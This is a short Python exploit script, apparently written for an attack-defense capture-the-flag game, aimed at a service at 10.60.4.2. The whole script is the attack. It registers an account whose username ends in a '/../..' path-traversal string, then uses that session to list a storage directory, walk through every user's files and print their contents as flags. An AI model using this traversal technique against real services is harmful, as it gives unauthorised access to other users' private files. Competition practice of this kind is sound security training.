import json

from api import register, process_file, gen_string


def main():
    hostname = "10.60.4.2"
    session = register(hostname, gen_string() + "/../..", gen_string())
    users = json.loads(process_file(session, hostname, "storage/"))
    for user in users:
        user_files = json.loads(process_file(session, hostname, f"storage/{user}"))
        for user_file in user_files:
            flag = process_file(session, hostname, f"storage/{user}/{user_file}")
            print(flag)


if __name__ == '__main__':
    main()
